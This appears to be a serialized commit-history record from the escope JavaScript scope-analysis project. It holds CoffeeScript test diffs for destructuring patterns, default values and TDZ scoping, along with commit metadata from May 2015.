expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 2<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>+        expect(scope.implicit.left[0].from.type).to.equal 'TDZ'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].from.type).to.equal 'for'<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.equal 'TDZ'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.equal 'array'<\n>+        expect(scope.references[0].isWrite()).to.be.false<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.equal 'for'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 5<\n>+        expect(scope.references[0].identifier.name).to.equal 'c'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].writeExpr.name).to.equal 'd'<\n>+        expect(scope.references[0].partial).to.be.false<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[1].identifier.name).to.equal 'd'<\n>+        expect(scope.references[1].isWrite()).to.be.false<\n>+        expect(scope.references[2].identifier.name).to.equal 'a'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[2].partial).to.be.true<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[0]<\n>+        expect(scope.references[3].identifier.name).to.equal 'b'<\n>+        expect(scope.references[3].isWrite()).to.be.true<\n>+        expect(scope.references[3].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[3].partial).to.be.true<\n>+        expect(scope.references[3].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[4].identifier.name).to.equal 'c'<\n>+        expect(scope.references[4].isWrite()).to.be.true<\n>+        expect(scope.references[4].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[4].partial).to.be.true<\n>+        expect(scope.references[4].resolved).to.equal scope.variables[2]<\n>+    it 'Pattern with nested default values in var in ForInStatement'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            for (var [a<c> [b<c> c = d] = e] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 3<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'e'<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.equal 'a'<\n>+        expect(scope.variables[2].name).to.equal 'b'<\n>+        expect(scope.variables[3].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 9<\n>+        expect(scope.references[0].identifier.name).to.equal 'b'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].writeExpr.name).to.equal 'e'<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[1].identifier.name).to.equal 'c'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].writeExpr.name).to.equal 'e'<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[2].identifier.name).to.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>+        expect(scope.references[2].partial).to.be.false<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.equal 'd'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        expect(scope.references[4].identifier.name).to.equal 'e'<\n>+        expect(scope.references[4].isWrite()).to.be.false<\n>+        expect(scope.references[5].identifier.name).to.equal 'a'<\n>+        expect(scope.references[5].isWrite()).to.be.true<\n>+        expect(scope.references[5].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[5].partial).to.be.true<\n>+        expect(scope.references[5].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[6].identifier.name).to.equal 'b'<\n>+        expect(scope.references[6].isWrite()).to.be.true<\n>+        expect(scope.references[6].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[6].partial).to.be.true<\n>+        expect(scope.references[6].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[7].identifier.name).to.equal 'c'<\n>+        expect(scope.references[7].isWrite()).to.be.true<\n>+        expect(scope.references[7].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[7].partial).to.be.true<\n>+        expect(scope.references[7].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[8].identifier.name).to.equal 'array'<\n>+        expect(scope.references[8].isWrite()).to.be.false<\n>+    it 'Pattern with nested default values in let in ForInStatement'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            for (let [a<c> [b<c> c = d] = e] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 3<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>+        expect(scope.implicit.left[0].from.type).to.equal 'TDZ'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].from.type).to.equal 'for'<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal 'e'<\n>+        expect(scope.implicit.left[2].from.type).to.equal 'for'<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.equal 'TDZ'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.equal 'array'<\n>+        expect(scope.references[0].isWrite()).to.be.false<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.equal 'for'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.equal 'a'<\n>+        expect(scope.variables[1].name).to.equal 'b'<\n>+        expect(scope.variables[2].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 8<\n>+        expect(scope.references[0].identifier.name).to.equal 'b'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].writeExpr.name).to.equal 'e'<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.equal 'c'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].writeExpr.name).to.equal 'e'<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>+        expect(scope.references[2].partial).to.be.false<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[3].identifier.name).to.equal 'd'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        expect(scope.references[4].identifier.name).to.equal 'e'<\n>+        expect(scope.references[4].isWrite()).to.be.false<\n>+        expect(scope.references[5].identifier.name).to.equal 'a'<\n>+        expect(scope.references[5].isWrite()).to.be.true<\n>+        expect(scope.references[5].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[5].partial).to.be.true<\n>+        expect(scope.references[5].resolved).to.equal scope.variables[0]<\n>+        expect(scope.references[6].identifier.name).to.equal 'b'<\n>+        expect(scope.references[6].isWrite()).to.be.true<\n>+        expect(scope.references[6].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[6].partial).to.be.true<\n>+        expect(scope.references[6].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[7].identifier.name).to.equal 'c'<\n>+        expect(scope.references[7].isWrite()).to.be.true<\n>+        expect(scope.references[7].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[7].partial).to.be.true<\n>+        expect(scope.references[7].resolved).to.equal scope.variables[2]<\n>+    it 'Pattern with default values in var in ForInStatement (separate declarations)'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            var a<c> b<c> c;<\n>+            for ([a<c> b<c> c = d] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 2<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 4<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.equal 'a'<\n>+        expect(scope.variables[2].name).to.equal 'b'<\n>+        expect(scope.variables[3].name).to.equal 'c'<\n>+        expect(scope.references).to.have.length 6<\n>+        expect(scope.references[0].identifier.name).to.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[2]<\n>+        expect(scope.references[2].identifier.name).to.equal 'c'<\n>+        expect(scope.references[2].isWrite()).to.be.true<\n>+        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>+        expect(scope.references[2].partial).to.be.false<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[3].identifier.name).to.equal 'c'<\n>+        expect(scope.references[3].isWrite()).to.be.true<\n>+        expect(scope.references[3].writeExpr.name).to.equal 'array'<\n>+        expect(scope.references[3].partial).to.be.true<\n>+        expect(scope.references[3].resolved).to.equal scope.variables[3]<\n>+        expect(scope.references[4].identifier.name).to.equal 'd'<\n>+        expect(scope.references[4].isWrite()).to.be.false<\n>+        expect(scope.references[5].identifier.name).to.equal 'array'<\n>+        expect(scope.references[5].isWrite()).to.be.false<\n>+    it 'Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            var obj;<\n>+            for ([obj.a<c> obj.b<c> obj.c = d] in array);<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 2<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.equal 'obj'<\n>+        expect(scope.references).to.have.length 5<\n>+        expect(scope.references[0].identifier.name).to.equal 'obj'  # obj.a<\n>+        expect(scope.references[0].isWrite()).to.be.false<\n>+        expect(scope.references[0].isRead()).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.equal 'obj'  # obj.b<\n>+        expect(scope.references[1].isWrite()).to.be.false<\n>+        expect(scope.references[1].isRead()).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.equal 'obj'  # obj.c<\n>+        expect(scope.references[2].isWrite()).to.be.false<\n>+        expect(scope.references[2].isRead()).to.be.true<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[3].identifier.name).to.equal 'd'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        expect(scope.references[3].isRead()).to.be.true<\n>+        expect(scope.references[4].identifier.name).to.equal 'array'<\n>+        expect(scope.references[4].isWrite()).to.be.false<\n>+        expect(scope.references[4].isRead()).to.be.true<\n>+    it 'ArrayPattern with MemberExpression in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            var obj;<\n>+            [obj.a<c> obj.b<c> obj.c] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 1<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.equal 'obj'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.equal 'obj'<\n>+        expect(scope.references[0].isWrite()).to.be.false<\n>+        expect(scope.references[0].isRead()).to.be.true<\n>+        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.equal 'obj'<\n>+        expect(scope.references[1].isWrite()).to.be.false<\n>+        expect(scope.references[1].isRead()).to.be.true<\n>+        expect(scope.references[1].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.equal 'obj'<\n>+        expect(scope.references[2].isWrite()).to.be.false<\n>+        expect(scope.references[2].isRead()).to.be.true<\n>+        expect(scope.references[2].resolved).to.equal scope.variables[1]<\n>+        expect(scope.references[3].identifier.name).to.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        expect(scope.references[3].isRead()).to.be.true<\n>+    it 'SpreadElement with MemberExpression in AssignmentExpression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            [a<c> b<c> ...obj.rest] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        expect(scope.implicit.left).to.have.length 4<\n>+        expect(scope.implicit.left.map((ref) => ref.identifier.name)).to.deep.equal [<\n>+            'a'<\n>+            'b'<\n>+            'obj'<\n>+            'array'<\n>+        ]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.equal 'arguments'<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.equal 'a'<\n>+        expect(scope.references[0].isWrite()).to.be.true<\n>+        expect(scope.references[0].partial).to.be.true<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+        expect(scope.references[1].identifier.name).to.equal 'b'<\n>+        expect(scope.references[1].isWrite()).to.be.true<\n>+        expect(scope.references[1].partial).to.be.true<\n>+        expect(scope.references[1].resolved).to.be.null<\n>+        expect(scope.references[2].identifier.name).to.equal 'obj'<\n>+        expect(scope.references[2].isWrite()).to.be.false<\n>+        expect(scope.references[3].identifier.name).to.equal 'array'<\n>+        expect(scope.references[3].isWrite()).to.be.false<\n>+        expect(scope.references).to.have.length 6<\n>+                'd' # assign 20<\n>+                'd' # assign array<\n>+        expect(scope.references).to.have.length 7<\n>+        for name<c> index in [<\n>+                'a' # assign array<\n>+                'b' # assign array<\n>+                'c' # assign array<\n>+                'd' # assign e<\n>+                'd' # assign array<\n>+                'e'<\n>+                'array'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+    it 'nested default values containing references and patterns in var'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            var [a<c> b<c> [c<c> d = e] = f ] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.equal 'function'<\n>+        expect(scope.variables).to.have.length 5<\n>+                'arguments'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.equal name<\n>+        expect(scope.references).to.have.length 10<\n>+        for name<c> index in [<\n>+                'a' # assign array<\n>+                'b' # assign array<\n>+                'c' # assign f<\n>+                'c' # assign array<\n>+                'd' # assign f<\n>+                'd' # assign e<\n>+                'd' # assign array<\n>+                'f'<\n>+            expect(scope.references[index].identifier.name).to.equal name<\n>+espree = require '../third_party/espree'<\n>+    it 'materialize rest argument in scope (esprima: rest property of FunctionDeclaration)'<c> -><\n>+    it 'materialize rest argument in scope (espree: RestElement)'<c> -><\n>+        ast = espree """"""<\n>+        function foo(...bar) {<\n>+            return bar;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 1<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'bar'<\n>+        expect(scope.variables[1].defs[0].name.name).to.be.equal 'bar'<\n>+        expect(scope.variables[1].defs[0].rest).to.be.true<\n>+espree = require '../third_party/espree'<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+        it 'the reference in default parameters should be resolved.'<c> -><\n>+            ast = espree """"""<\n>+            let a = 0;<\n>+            function foo(b = a) {<\n>+            }<\n>+            """"""<\n>+            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>+            expect(scope.references).to.have.length 2  # [b<c> a]<\n>+            reference = scope.references[1]<\n>+            expect(reference.from).to.equal scope<\n>+            expect(reference.identifier.name).to.equal 'a'<\n>+            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>+            expect(reference.writeExpr).to.be.undefined<\n>+            expect(reference.isWrite()).to.be.false<\n>+            expect(reference.isRead()).to.be.true<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>+            ast = espree """"""<\n>","-    ""espree"": ""^1.11.0""<c><\n>-    constructor(rootPattern<c> referencer<c> callback) {<\n>-        this.referencer = referencer;<\n>-    }<\n>-    perform(pattern) {<\n>-        if (pattern.type === Syntax.Identifier) {<\n>-            this.callback(pattern<c> true);<\n>-            return;<\n>-        }<\n>-        this.visit(pattern);<\n>-        this.callback(pattern<c> false);<\n>-            if (property.shorthand) {<\n>-                this.visit(property.key);<\n>-                continue;<\n>-            if (element) {<\n>-                this.visit(element);<\n>-            }<\n>-        this.visit(pattern.left);<\n>-        // FIXME: Condier TDZ scope.<\n>-        this.referencer.visit(pattern.right);<\n>-    var visitor = new PatternVisitor(rootPattern<c> referencer<c> callback);<\n>-    visitor.perform(rootPattern);<\n>-    return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement || nodeType === Syntax.RestElement || nodeType === Syntax.AssignmentPattern;<\n>-        this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>-    visitPattern(node<c> callback) {<\n>-        traverseIdentifierInPattern(node<c> this<c> callback);<\n>-            this.visitPattern(node.params[i]<c> (pattern) => {<\n>-                        false<\n>-                if (!isPattern(node.left)) {<\n>-                    this.visit(node.left);<\n>-                }<\n>-                this.visitPattern(node.left<c> (pattern) => {<\n>-    visitVariableDeclaration(variableTargetScope<c> type<c> node<c> index) {<\n>-        this.visitPattern(decl.id<c> (pattern<c> toplevel) => {<\n>-                this.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-                this.visitPattern(node.left<c> (pattern<c> toplevel) => {<\n>-                    this.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-        this.visitPattern(node.param<c> (pattern) => {<\n>-        expect(scope.references).to.have.length 5<\n>-                'd'<\n>-        expect(scope.references).to.have.length 6<\n>-            expect(scope.references[index].identifier.name).to.be.equal name<\n>-    it 'materialize rest argument in scope'<c> -><\n>-harmony = require '../third_party/esprima'<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>-            ast = harmony.parse """"""<\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Fri,7,56,8 May 2015,Merge pull request #61 from mysticatea/fix-references-of-top-level-let-const-class Fix the reference resolving logic for global.,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Fri,23,10,8 May 2015,Remove several tests. - default parameters of functions and default values of destructuring assignment are not supported yet. Ill add those later again.,0,0,1,217,11109,+    describe 'When there is a `var` declaration in functions<c>'<c> -><\n>+        it 'the reference on the function should be resolved.'<c> -><\n>+                var a = 0;<\n>+            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+            scope = scopeManager.scopes[1]<\n>+            expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+            expect(scope.references).to.have.length 1<\n>+            reference = scope.references[0]<\n>+            expect(reference.resolved).to.equal scope.variables[1]<\n>+            expect(reference.writeExpr).to.not.be.undefined<\n>+            expect(reference.isWrite()).to.be.true<\n>+            expect(reference.isRead()).to.be.false<\n>+        it 'the reference in nested functions should be resolved.'<c> -><\n>+                var a = 0;<\n>+                    var b = a;<\n>,"-        it 'the reference in default parameters should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            let a = 0;<\n>-            function foo(b = a) {<\n>-            }<\n>-            """"""<\n>-            console.log(JSON.stringify(ast<c> null<c> 2))<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            let a = 0;<\n>-            function foo() {<\n>-                let {b: a} = {};<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default parameters should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            const a = 0;<\n>-            function foo(b = a) {<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            const a = 0;<\n>-            function foo() {<\n>-                const {b: a} = {};<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default parameters should NOT be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            var a = 0;<\n>-            function foo(b = a) {<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            expect(reference.resolved).to.be.null<\n>-            expect(reference.writeExpr).to.be.undefined<\n>-            expect(reference.isWrite()).to.be.false<\n>-            expect(reference.isRead()).to.be.true<\n>-        it 'the reference in default values of destructuring should NOT be resolved.'<c> -><\n>-            ast = harmony.parse """"""<\n>-            var a = 0;<\n>-            function foo() {<\n>-                var {b: a} = {};<\n>-            }<\n>-            """"""<\n>-            scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-            expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-            scope = scopeManager.scopes[1]<\n>-            expect(scope.variables).to.have.length 2  # [arguments<c> b]<\n>-            expect(scope.references).to.have.length 2  # [b<c> a]<\n>-            reference = scope.references[1]<\n>-            expect(reference.from).to.equal scope<\n>-            expect(reference.identifier.name).to.equal 'a'<\n>-            